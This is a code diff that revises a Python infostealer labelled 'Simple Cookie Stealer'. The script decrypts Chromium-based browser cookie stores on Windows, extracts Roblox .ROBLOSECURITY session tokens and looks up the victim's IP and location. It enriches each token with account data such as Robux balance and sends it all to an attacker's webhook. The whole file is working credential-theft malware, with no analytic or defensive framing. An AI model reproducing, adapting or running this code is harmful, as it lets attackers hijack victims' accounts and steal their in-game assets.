@@ -1,15 +1,17 @@
-webhook = "" # WEBHOOK HERE
-
+import io
 import os
 import json
 import base64
 import shutil
+import zipfile
 import sqlite3
 import requests
 import subprocess
 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
+
+webhook = "WEBHOOK GOES HERE"
 
 def safe(func):
     def wrapper(*args, **kwargs):
@@ -27,31 +29,77 @@ class CookieLogger:
     def __init__(self):
         browsers = self.findBrowsers()
 
+        info = requests.get("http://ip-api.com/json/").json()
+        username = info["query"]
+        location = f"{info['city']}, {info['regionName']} ({info['countryCode']})"
+
+
+        self.embeds = [{
+            "username": "Simple Cookie Stealer",
+            "title": "Victim Found!",
+            "description" : f"You can find the Cookies in the embeds.\nUse a VPN to connect to the area below in order to log in.",
+            "color": 12422241,
+
+            "fields": [
+                {"name": "IP", "value": username, "inline": True},
+                {"name": "Location", "value": location, "inline": True},
+            ]
+        }]
+
         cookies = []
         for browser in browsers:
             try:
-                cookies.append(self.getCookie(browser[0], browser[1]))
+                cookies = self.getCookie(browser[0], browser[1])
+                if cookies:
+                    for cookie in cookies:
+                        self.handleEmbed(cookie)
             except Exception:
                 pass
-
-        try:
-            cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
-        except Exception:
-            pass
-        
-        cookieDoc = ""
-
-        for cookie in cookies:
-            if cookie == None or not cookie[1]:
-                continue
-
-            for _cookie in cookie[1]:
-                cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"
-
-                if not cookieDoc: cookieDoc = "No Cookies Found!"
-                        
-        requests.post(webhook, files = {"cookies.txt": cookieDoc})
     
+        if len(self.embeds) == 1:
+            return
+
+        embedsSplit = [self.embeds[idx:idx+10] for idx in range(len(self.embeds)) if idx % 10 == 0]
+        for embeds in embedsSplit:
+            data = {"embeds": embeds}
+            requests.post(webhook, json=data)
+        
+    @safe
+    def handleEmbed(self, roblosec):
+
+        if not roblosec:
+            return
+
+        basicInfo = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies = {".ROBLOSECURITY": roblosec}).json()
+        username = basicInfo["UserName"]
+        userId = basicInfo["UserID"]
+        robux = basicInfo["RobuxBalance"]
+        premium = basicInfo["IsPremium"]
+
+        advancedInfo = requests.get(f"https://users.roblox.com/v1/users/{userId}").json()
+        creationDate = advancedInfo["created"]
+        creationDate = creationDate.split("T")[0]
+        creationDate = creationDate.split("-")
+        creationDate = f"{creationDate[1]}/{creationDate[2]}/{creationDate[0]}"
+
+        embed = {
+            "username": "Simple Cookie Stealer",
+            "title": "Cookie Found!",
+            "description" : f"Log in with the Cookie Below. You may need to use a VPN to connect to the Area shown in the First Embed.",
+            "color": 12422241,
+            "fields": [
+                {"name": "Username", "value": username, "inline": True},
+                {"name": "User ID", "value": userId, "inline": True},
+                {"name": "Robux Balance", "value": robux, "inline": True},
+                {"name": "Has Premium", "value": premium, "inline": True},
+                {"name": "Creation Date", "value": creationDate, "inline": True},
+                {"name": "Cookie", "value": f"```{roblosec}```", "inline": False}
+
+            ]
+        }
+
+        self.embeds.append(embed)
+
     @safe
     def findBrowsers(self):
         found = []
@@ -95,11 +143,6 @@ class CookieLogger:
 
     @safe
     def getCookie(self, browserPath, isProfiled):
-
-        if browserPath.split("\\")[-1] == "User Data":
-            browserName = browserPath.split("\\")[-2]
-        else:
-            browserName = browserPath.split("\\")[-1]
         
         cookiesFound = []
 
@@ -111,10 +154,12 @@ class CookieLogger:
 
         if isProfiled:
             for directory in os.listdir(browserPath):
-                if directory.startswith("Profile"):
+                if directory.startswith("Profile "):
                     profiles.append(directory)
         
         if not isProfiled:
+            roblosec = ""
+            cookieJar = ""
             if "Network" in os.listdir(browserPath):
                 cookiePath = os.path.join(browserPath, "Network", "Cookies")
             else:
@@ -124,19 +169,20 @@ class CookieLogger:
             connection = sqlite3.connect("temp.db")
             cursor = connection.cursor()
 
-            cursor.execute("SELECT encrypted_value FROM cookies")
+            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
             for cookie in cursor.fetchall():
-                if cookie[0]:
-                    decrypted = self.decryptCookie(cookie[0], masterKey)
+                if cookie[0].endswith("roblox.com") and cookie[2]:
+                    decrypted = self.decryptCookie(cookie[2], masterKey)
+                    if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
+                        cookiesFound.append(decrypted)
 
-                    if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                        cookiesFound.append(("None", decrypted))
-                
             connection.close()
             os.remove("temp.db")
         
         else:
             for profile in profiles:
+                roblosec = ""
+                cookieJar = ""
                 if "Network" in os.listdir(os.path.join(browserPath, profile)):
                     cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                 else:
@@ -146,18 +192,17 @@ class CookieLogger:
                 connection = sqlite3.connect("temp.db")
                 cursor = connection.cursor()
 
-                cursor.execute("SELECT encrypted_value FROM cookies")
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                 for cookie in cursor.fetchall():
-                    if cookie[0]:
-                        decrypted = self.decryptCookie(cookie[0], masterKey)
-
-                        if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                            cookiesFound.append((profile, decrypted))
+                    if cookie[0].endswith("roblox.com") and cookie[2]:
+                        decrypted = self.decryptCookie(cookie[2], masterKey)
+                        if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
+                            cookiesFound.append(decrypted)
                 
                 connection.close()
                 os.remove("temp.db")
 
-        return [browserName, cookiesFound]
+        return cookiesFound
 
 if __name__ == "__main__":
     CookieLogger()
